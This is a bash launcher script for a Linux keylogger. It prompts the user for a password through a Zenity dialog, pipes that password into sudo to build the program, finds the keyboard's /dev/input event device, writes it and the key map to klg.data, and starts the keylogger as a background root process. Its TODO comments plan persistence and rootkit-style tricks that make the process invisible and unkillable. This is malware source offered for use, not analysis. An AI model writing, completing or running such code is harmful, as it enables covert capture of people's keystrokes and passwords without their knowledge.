#! /bin/bash

parse(){
    keyMap=$(echo "$@" |\
     sed 's|backslash|\\|g' |\
	 sed 's|slash|/|g' |\
	 sed "s|apostrophe|'|g" |\
	 sed "s|parenright|)|g" |\
	 sed "s|parenleft|(|g" |\
	 sed "s|question|?|g" |\
	 sed "s|exclam|!|g" |\
	 sed "s|eacute|é|g" |\
	 sed "s|colon|:|g" |\
	#  sed 's|Return|\x0a|g' |\
	 sed 's|dollar|\$|g')
}

getKbdMap(){
	keyboards=$(cat /proc/bus/input/devices | grep -A 7 keyboard)
	eventfile=$(echo $keyboards | grep "H: " | sed -n 's/^.*\(event[^ ]*\).*/\1/p')
	#TODO clean sed command
	keyMap=$(xmodmap -pke | awk  '{printf substr($0, index($0, $3))"|\n"}' | cut -c3- )
	parse "${keyMap//[$'\t\r\n']}"
}

#Ask password
password=$(zenity --password --title=Authentication)"\n\n\n"

#Build program
echo -e $password | sudo -S make re #fclean debug
if [ $? -ne 0 ]
then
echo -e "MAKE FAILED\n"
exit 0 
fi
#Get keyboard params
getKbdMap
echo "/dev/input/$eventfile" > klg.data
echo "${keyMap}" >> klg.data
#Run program in root in a daemonized process
echo -e $password | sudo -S -b ./keylogger &

#TODO loop on $? for retry password
#TODO completer le PARSEUR
#TODO ajouter un systeme de persistence du keylogger
#DONE deamonize process
#TODO PUT a define thats hide or not process

#TODOFORPRODUCT
# put process unkillable in kill.c
# put process invisible in readdir.c